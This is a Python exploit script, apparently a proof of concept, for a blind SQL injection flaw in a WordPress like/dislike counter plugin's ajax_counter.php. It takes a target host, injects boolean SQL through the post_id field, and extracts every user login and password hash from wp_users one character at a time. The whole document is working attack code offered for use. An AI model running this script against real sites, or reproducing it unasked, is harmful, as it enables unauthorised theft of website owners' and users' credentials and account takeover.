import requests
import string

url = input("Target Host : ")

if(url.startswith('http://') != 1) :
    url = "http://"+url

url = url + "/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php"

count=0
while True :
    brute_string = '1 and (select count(*) from wordpress.wp_users) = ' + str(count)
    payload = {'post_id' : brute_string, 'up_type' : 'like'}
    r = requests.post(url, data = payload)
    blindRes = int(r.content)

    if blindRes :
        print '[!] Find How Many Datas in the Wordpress.wp_users :: '+str(count)
        break
    count = count+1
    print '[*] Finding How Many Datas in the Wordpress.wp_users :: if count='+str(count)+'? :: No'

userNames = [""]*count
userPass = [""]*count
# url = "http://192.168.0.200/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php"
for x in range(count):
    for y in range(1,15):
        for z in range(32,127):
            brute_string = '1 and substring((select user_login from wordpress.wp_users limit '+str(x)+',1),'+str(y)+',1) = char('+str(z)+')'
            payload = {'post_id' : brute_string, 'up_type' : 'like'}
            r = requests.post(url, data = payload)
            blindRes = int(r.content)

            if blindRes :
                userNames[x] = userNames[x]+chr(z)
                print '[!] Find User Login ID (No.'+str(x)+', '+str(y)+'th Character :: Result >> '+userNames[x]+' )'
                break

            print '[*] Finding User Login ID (No.'+str(x)+', '+str(y)+'th Character is \''+chr(z)+'\' ? >> No!!! )'
    for y in range(1,35):
        for z in range(32,127):
            brute_string = '1 and substring((select user_pass from wordpress.wp_users limit '+str(x)+',1),'+str(y)+',1) = char('+str(z)+')'
            payload = {'post_id' : brute_string, 'up_type' : 'like'}
            r = requests.post(url, data = payload)
            blindRes = int(r.content)

            if blindRes :
                userPass[x] = userPass[x]+chr(z)
                print '[!] Find User Password ID (No.'+str(x)+', '+str(y)+'th Character :: Result >> '+userPass[x]+' )'
                break
            print '[*] Finding User Password ID (No.'+str(x)+', '+str(y)+'th Character is \''+chr(z)+'\' ? >> No!!! )'
    print userNames[x]+' /// '+userPass[x]
